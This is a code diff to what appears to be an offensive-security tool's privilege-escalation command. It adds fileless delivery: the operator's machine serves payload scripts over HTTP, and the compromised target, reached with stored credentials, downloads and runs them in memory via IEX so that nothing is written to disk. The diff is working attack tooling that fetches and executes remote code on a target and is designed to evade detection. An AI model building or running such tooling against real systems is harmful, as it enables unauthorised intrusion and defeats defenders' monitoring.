@@ -637,12 +637,35 @@ def cmd_escalate(args):
 
         results = {}
 
-        def fire(vector):
+        def _run_vector(vector, command):
             action = executor_mod.Action(
-                host=host, cred=cred, command=vector.command,
+                host=host, cred=cred, command=command,
                 label=f"escalate:{vector.key}", safety=vector.safety, shell=vector.shell)
-            res = executor_mod.execute(store, action, allow=allow,
-                                       on_event=lambda m: print(m))
+            return executor_mod.execute(store, action, allow=allow, on_event=lambda m: print(m))
+
+        def fire(vector):
+            serves = getattr(vector, "serves", ())
+            if serves:
+                # in-memory delivery: serve the script(s) over HTTP and let the target IEX
+                # them ({url} in the command). Nothing lands on disk.
+                paths = [arsenal_mod.find(n) for n in serves]
+                if not all(paths):
+                    missing = ", ".join(n for n, p in zip(serves, paths) if not p)
+                    res = executor_mod.ExecResult(
+                        blocked=f"{missing} not in the arsenal — stage it to serve in-memory")
+                elif not cfg.get("lhost"):
+                    res = executor_mod.ExecResult(
+                        blocked="no lhost — `config set lhost=<ip>` so the target can pull "
+                                "the in-memory payload")
+                else:
+                    directory = os.path.dirname(paths[0])
+                    with staging_mod.serve(directory) as port:
+                        url = f"http://{cfg.get('lhost')}:{port}/"
+                        print(f"  serving {os.path.basename(paths[0])} on "
+                              f"{cfg.get('lhost')}:{port} — target IEX-loads it in memory")
+                        res = _run_vector(vector, vector.command.replace("{url}", url))
+            else:
+                res = _run_vector(vector, vector.command)
             results[vector.key] = res
             return res
 
